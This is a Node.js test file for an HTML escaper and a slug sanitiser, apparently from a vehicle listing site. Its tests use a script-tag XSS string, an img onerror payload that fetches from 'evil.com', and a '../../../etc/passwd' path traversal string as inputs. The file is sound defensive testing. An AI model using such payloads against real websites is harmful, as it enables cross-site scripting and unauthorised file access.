const { test, describe } = require('node:test');
const assert = require('node:assert/strict');

function escapeHTML(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function sanitizeSlug(str) {
  if (typeof str !== 'string') return '';
  return str
    .toLowerCase()
    .trim()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '');
}

describe('Security & XSS Sanitization Engine', () => {
  test('escapes script tags and attributes properly', () => {
    const raw = '<script>alert("XSS")</script>';
    const escaped = escapeHTML(raw);
    assert.equal(escaped, '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
  });

  test('escapes malicious HTML attributes and event handlers', () => {
    const raw = '<img src=x onerror="fetch(\'http://evil.com\')">';
    const escaped = escapeHTML(raw);
    assert.ok(!escaped.includes('<'));
    assert.ok(!escaped.includes('>'));
    assert.ok(!escaped.includes('"'));
  });

  test('sanitizes vehicle slugs safely against path traversal', () => {
    assert.equal(sanitizeSlug('Mahindra Thar 4x4!'), 'mahindra-thar-4x4');
    assert.equal(sanitizeSlug('../../../etc/passwd'), 'etc-passwd');
    assert.equal(sanitizeSlug('Toyota Fortuner -- Luxury 2026'), 'toyota-fortuner-luxury-2026');
  });
});
